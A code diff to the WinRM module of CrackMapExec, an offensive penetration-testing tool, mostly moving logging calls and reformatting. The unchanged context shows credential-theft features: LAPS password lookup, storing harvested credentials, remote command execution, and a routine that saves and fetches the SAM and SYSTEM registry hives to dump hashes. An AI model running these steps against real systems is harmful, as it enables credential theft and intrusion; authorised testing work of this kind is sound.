@@ -1,13 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+import binascii
+import hashlib
 from datetime import datetime
 import os
-
 import requests
 from impacket.smbconnection import SMBConnection, SessionError
-from sqlalchemy import select
-from urllib3.exceptions import NewConnectionError
-
 from cme.connection import *
 from cme.helpers.logger import highlight
 from cme.helpers.bloodhound import add_user_bh
@@ -15,6 +13,7 @@ from cme.protocols.ldap.smbldap import LDAPConnect
 from cme.logger import CMEAdapter
 from pypsrp.client import Client
 from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
+import logging
 
 # The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -67,24 +66,15 @@ class winrm(connection):
 
         return parser
 
-    def proto_flow(self):
-        self.proto_logger()
-        if self.create_conn_obj():
-            self.enum_host_info()
-            if self.print_host_info():
-                if self.login():
-                    if hasattr(self.args, 'module') and self.args.module:
-                        self.call_modules()
-                    else:
-                        self.call_cmd_args()
-
     def proto_logger(self):
-        self.logger = CMEAdapter(extra={
-            'protocol': 'SMB',
-            'host': self.host,
-            'port': 'NONE',
-            'hostname': 'NONE'
-        })
+        self.logger = CMEAdapter(
+            extra={
+                'protocol': 'WINRM',
+                'host': self.host,
+                'port': self.args.port,
+                'hostname': self.hostname
+            }
+        )
 
     def enum_host_info(self):
         # smb no open, specify the domain
@@ -117,7 +107,7 @@ class winrm(connection):
                 except:
                     pass
             except Exception as e:
-                logging.debug("Error retrieving host domain: {} specify one manually with the '-d' flag".format(e))
+                self.logger.error("Error retrieving host domain: {} specify one manually with the '-d' flag".format(e))
 
             if self.args.domain:
                 self.domain = self.args.domain
@@ -132,9 +122,12 @@ class winrm(connection):
 
             self.db.add_host(self.host, self.port, self.hostname, self.domain, self.server_os)
 
-        self.output_filename = os.path.expanduser('~/.cme/logs/{}_{}_{}'.format(self.hostname, self.host, datetime.now().strftime("%Y-%m-%d_%H%M%S")))
+        self.output_filename = os.path.expanduser('~/.cme/logs/{}_{}_{}'.format(
+            self.hostname,
+            self.host,
+            datetime.now().strftime("%Y-%m-%d_%H%M%S")
+        ))
         self.output_filename = self.output_filename.replace(":", "-")
-
 
     def laps_search(self, username, password, ntlm_hash, domain):
         ldap_conn = LDAPConnect(self.domain, "389", self.domain)
@@ -145,7 +138,7 @@ class winrm(connection):
             ntlm_hash[0] if ntlm_hash else ''
         )
         if not login:
-            logging.debug('LAPS login failed with account {}'.format(username))
+            self.logger.debug(f"LAPS login failed with account {username}")
             return False
         search_filter = f"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(name='{self.hostname}))"
         attributes = ['ms-MCS-AdmPwd', 'samAccountname']
@@ -165,11 +158,11 @@ class winrm(connection):
                     sAMAccountName = str(host['vals'][0])
                 else:
                     msMCSAdmPwd = str(host['vals'][0])
-            logging.debug("Host: {:<20} Password: {} {}".format(sAMAccountName, msMCSAdmPwd, self.hostname))
+            self.logger.debug("Host: {:<20} Password: {} {}".format(sAMAccountName, msMCSAdmPwd, self.hostname))
         self.username = self.args.laps
         self.password = msMCSAdmPwd
         if msMCSAdmPwd == '':
-            logging.debug('msMCSAdmPwd is empty, account cannot read LAPS property for {}'.format(self.hostname))
+            self.logger.debug('msMCSAdmPwd is empty, account cannot read LAPS property for {}'.format(self.hostname))
             return False
         if ntlm_hash:
             hash_ntlm = hashlib.new('md4', msMCSAdmPwd.encode('utf-16le')).digest()
@@ -180,12 +173,12 @@ class winrm(connection):
     def print_host_info(self):
         if self.args.domain:
             self.logger.extra['protocol'] = "HTTP"
-            self.logger.info(self.endpoint)
+            self.logger.display(self.endpoint)
         else:
             self.logger.extra['protocol'] = "SMB"
-            self.logger.info(u"{} (name:{}) (domain:{})".format(self.server_os, self.hostname, self.domain))
+            self.logger.display(u"{} (name:{}) (domain:{})".format(self.server_os, self.hostname, self.domain))
             self.logger.extra['protocol'] = "HTTP"
-            self.logger.info(self.endpoint)
+            self.logger.display(self.endpoint)
         self.logger.extra['protocol'] = "WINRM"
         if self.args.laps:
             return self.laps_search(self.args.username, self.args.password, self.args.hash, self.domain)
@@ -199,9 +192,9 @@ class winrm(connection):
 
         for url in endpoints:
             try:
-                logging.debug(f"winrm create_conn_obj() - Requesting URL: {url}")
+                self.logger.debug(f"winrm create_conn_obj() - Requesting URL: {url}")
                 res = requests.post(url, verify=False, timeout=self.args.http_timeout)
-                logging.debug(f"winrm create_conn_obj() - Received response code: {res.status_code}")
+                self.logger.debug(f"winrm create_conn_obj() - Received response code: {res.status_code}")
                 self.endpoint = url
                 if self.endpoint.startswith('https://'):
                     self.port = self.args.port if self.args.port else 5986
@@ -210,12 +203,12 @@ class winrm(connection):
                 self.logger.extra['port'] = self.port
                 return True
             except requests.exceptions.Timeout as e:
-                logging.debug(f"Connection Timed out to WinRM service: {e}")
+                self.logger.info(f"Connection Timed out to WinRM service: {e}")
             except requests.exceptions.ConnectionError as e:
                 if 'Max retries exceeded with url' in str(e):
-                    logging.debug(f"Connection Timeout to WinRM service (max retries exceeded)")
+                    self.logger.info(f"Connection Timeout to WinRM service (max retries exceeded)")
                 else:
-                    logging.debug(f"Other ConnectionError to WinRM service: {e}")
+                    self.logger.info(f"Other ConnectionError to WinRM service: {e}")
         return False
 
     def plaintext_login(self, domain, username, password):
@@ -267,8 +260,8 @@ class winrm(connection):
 
             self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.password}")
             self.db.add_credential('plaintext', domain, self.username, self.password)
+            # TODO: when we can easily get the host_id via RETURNING statements, readd this in
             # host_id = self.db.get_hosts(self.host)[0].id
-
             # self.db.add_loggedin_relation(user_id, host_id)
 
             if self.admin_privs:
@@ -395,7 +388,7 @@ class winrm(connection):
         try:
             r = self.conn.execute_cmd(self.args.execute)
         except:
-            self.logger.debug('Cannot execute cmd command, probably because user is not local admin, but powershell command should be ok !')
+            self.logger.info('Cannot execute cmd command, probably because user is not local admin, but powershell command should be ok !')
             r = self.conn.execute_ps(self.args.execute)
         self.logger.success('Executed command')
         self.logger.highlight(r[0])
@@ -407,10 +400,8 @@ class winrm(connection):
 
     def sam(self):
         self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
-     
         self.conn.fetch("C:\\windows\\temp\\SAM", self.output_filename + ".sam")
         self.conn.fetch("C:\\windows\\temp\\SYSTEM", self.output_filename + ".system")
-        
         self.conn.execute_cmd("del C:\\windows\\temp\\SAM && del C:\\windows\\temp\\SYSTEM")
 
         local_operations = LocalOperations(self.output_filename + ".system")
